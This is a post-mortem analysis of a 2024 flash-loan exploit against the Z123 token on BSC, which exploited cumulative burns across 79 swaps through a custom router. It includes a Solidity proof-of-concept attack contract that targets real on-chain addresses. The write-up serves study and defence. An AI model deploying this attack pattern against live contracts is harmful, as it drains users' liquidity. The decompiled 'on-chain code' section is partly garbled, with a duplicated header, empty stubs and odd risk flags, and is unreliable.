# Z123 — 79 Consecutive Swaps Excessive Liquidity Burn Analysis

| Item | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | Z123 |
| **Chain** | BSC |
| **Loss** | ~$135,000 |
| **Attack Contract** | [0x61dd07ce](https://bscscan.com/address/0x61dd07ce0cecf0d7bacf5eb208c57d16bbdee168) |
| **Vulnerable Contract** | [Z123 0xb000f121](https://bscscan.com/address/0xb000f121A173D7Dd638bb080fEe669a2F3Af9760) |
| **Victim Router** | [0x6125c643](https://bscscan.com/address/0x6125c643a2D4A927ACd63C1185c6be902eFd5dC8) |
| **Root Cause** | Each swap through the victim router excessively burns Z123 liquidity; after 79 iterations the supply reduction distorts the price, allowing the attacker to realize profit |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/Z123_exp.sol) |

---

## 1. Vulnerability Overview

The victim router of the Z123 token internally burns a portion of Z123 liquidity on every call to `swapExactTokensForTokensSupportingFeeOnTransferTokens()`. This burn amount accumulates proportionally with the number of swaps, causing the Z123 supply within the pair to plummet after 79 repeated swaps and distorting the price relative to USDT. The attacker borrowed 18M USDT via a PancakeSwap V3 flash loan, acquired Z123 in a single swap, then executed 79 swaps through the victim router to distort the price and realize arbitrage profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: excessive liquidity burned on every swap
contract Z123Token {
    // Transfer tax + burn mechanism
    function _transfer(address from, address to, uint256 amount) internal {
        uint256 burnAmount = amount * burnRate / 10000;
        _burn(from, burnAmount);  // ← burn accumulates on every swap

        uint256 netAmount = amount - burnAmount;
        _balances[from] -= amount;
        _balances[to] += netAmount;
    }
}

// Victim router: swapExactTokensForTokensSupportingFeeOnTransferTokens
// → internally calls Z123.transfer() repeatedly → cumulative burn
// → after 79 swaps Z123 balance plummets → price spikes relative to USDT

// ✅ Safe code: burn rate cap + per-block burn limit
uint256 constant MAX_BURN_RATE = 100; // 1% maximum
uint256 constant MAX_BLOCK_BURN = 1000e18;
uint256 public blockBurnAccum;
uint256 public lastBurnBlock;

function _burn(address from, uint256 amount) internal {
    if (block.number != lastBurnBlock) {
        blockBurnAccum = 0;
        lastBurnBlock = block.number;
    }
    require(blockBurnAccum + amount <= MAX_BLOCK_BURN, "block burn limit");
    blockBurnAccum += amount;
    // ...
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Z123_decompiled.sol
contract Z123 {
contract Z123 {
    address public owner;


    // Selector: 0x98650275

    // 📌 Minting - unlimited issuance risk
    function renounceMinter() external {}  // ❌ Vulnerability

    // Selector: 0xa9059cbb
    function transfer(address p0, uint256 p1) external {}

    // Selector: 0xdb79c5bf
    function setSaleDate(uint256 p0) external {}

    // Selector: 0xdd62ed3e
    function allowance(address p0, address p1) external view returns (uint256) {}

    // Selector: 0xdf28efe8
    function _transactFeeValue(uint256 p0) external {}

    // Selector: 0xaa271e1a

    // 📌 Minting - unlimited issuance risk
    function isMinter(address p0) external view returns (bool) {}

    // Selector: 0xc1bb672c
    function setWhite(address[] memory p0, uint256 p1) external {}

    // Selector: 0xa348c289
    function isWhite(address p0) external view returns (bool) {}

    // Selector: 0xa457c2d7
    function decreaseAllowance(address p0, uint256 p1) external {}

    // Selector: 0xa5dcc4c9
    function getContractorsFee(uint256 p0) external view returns (uint256) {}

    // Selector: 0x9ba071ed
    function sale_date() external {}

    // Selector: 0xa2d83b5e
    function update(address p0, uint256 p1) external {}

    // Selector: 0x39509351
    function increaseAllowance(address p0, uint256 p1) external {}

    // Selector: 0x70a08231
    function balanceOf(address p0) external view returns (uint256) {}

    // Selector: 0x95d89b41
    function symbol() external view returns (string memory) {}

    // Selector: 0x983b2d56

    // 📌 Minting - unlimited issuance risk
    function addMinter(address p0) external {}

    // Selector: 0x49f9b042
    function setTransactFee(uint256[] memory p0) external {}

    // Selector: 0x6b27eec1
    function setContractorsFee(uint256[] memory p0, address[] memory p1, uint256 p2) external {}

    // Selector: 0x18160ddd
    function totalSupply() external view returns (uint256) {}

    // Selector: 0x23b872dd
    // 📌 Arbitrary transferFrom - approval validation required
    function transferFrom(address p0, address p1, uint256 p2) external {}

    // Selector: 0x313ce567
    function decimals() external view returns (uint8) {}

    // Selector: 0x06fdde03
    function name() external view returns (string memory) {}

    // Selector: 0x095ea7b3
    // 📌 approve - safeApprove race condition risk
    function approve(address p0, uint256 p1) external {}

    // Selector: 0x616c6c65
    function unknown_616c6c65() external {}
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] PancakeSwap V3 Flash Loan: 18,000,000 USDT
  │
  ├─→ [2] Swap USDT → Z123 via normal router (1 time)
  │
  ├─→ [3] Swap Z123 → USDT via victim router × 79 times
  │         └─ Z123 burn accumulates on every swap
  │         └─ Z123 balance plummets → price distorted
  │
  ├─→ [4] Realize arbitrage profit from victim router price distortion
  │         └─ Receive high USDT output due to low Z123 balance
  │
  ├─→ [5] Repay V3 flash loan
  │
  └─→ [6] ~$135K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin,
        address[] calldata path, address to, uint256 deadline
    ) external;
}

contract AttackContract {
    IPancakeV3Pool  constant v3Pool     = IPancakeV3Pool(/* V3 USDT pool */);
    IPancakeRouter  constant normalRtr  = IPancakeRouter(/* normal PancakeRouter */);
    IPancakeRouter  constant victimRtr  = IPancakeRouter(0x6125c643a2D4A927ACd63C1185c6be902eFd5dC8);
    IERC20 constant Z123 = IERC20(0xb000f121A173D7Dd638bb080fEe669a2F3Af9760);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function testExploit() external {
        v3Pool.flash(address(this), 18_000_000e18, 0, "");
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        // [1] Swap USDT → Z123 via normal router (1 time)
        USDT.approve(address(normalRtr), 18_000_000e18);
        address[] memory pathBuy = new address[](2);
        pathBuy[0] = address(USDT); pathBuy[1] = address(Z123);
        normalRtr.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            18_000_000e18, 0, pathBuy, address(this), block.timestamp
        );

        // [2] Swap Z123 → USDT via victim router × 79 times
        // Z123 burn accumulates on every call → price distortion
        address[] memory pathSell = new address[](2);
        pathSell[0] = address(Z123); pathSell[1] = address(USDT);
        uint256 z123Bal = Z123.balanceOf(address(this));
        Z123.approve(address(victimRtr), z123Bal);

        for (uint i = 0; i < 79; i++) {
            uint256 chunk = Z123.balanceOf(address(this)) / (79 - i);
            victimRtr.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                chunk, 0, pathSell, address(this), block.timestamp
            );
        }

        // [3] Repay V3 flash loan
        USDT.transfer(address(v3Pool), 18_000_000e18 + fee1);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Price distortion via accumulated burn from repeated swaps |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (flash loan + 79 repeated swaps through victim router) |
| **DApp Category** | Burn-mechanism token + custom router |
| **Impact** | Pair liquidity loss (~$135K) |

## 6. Remediation Recommendations

1. **Per-block burn cap**: Set a maximum burn amount allowed within a single block
2. **Max burn rate per swap**: Limit the maximum percentage burned in a single swap (e.g., 0.1%)
3. **Router whitelist**: Allow swaps only through approved routers
4. **Burn cooldown**: Require a block interval to prevent consecutive burn triggers

## 7. Lessons Learned

- Token burn mechanisms can be accelerated through repeated swaps; a cap on cumulative burns within a single block is essential.
- FIL314 (hourBurn, 6,000 iterations) and Z123 (79 swaps) share the same pattern of distorting internal economic mechanisms through repeated operations.
- If swaps through a custom router trigger different burn/tax logic than the standard router, that router must be treated as an independent audit target.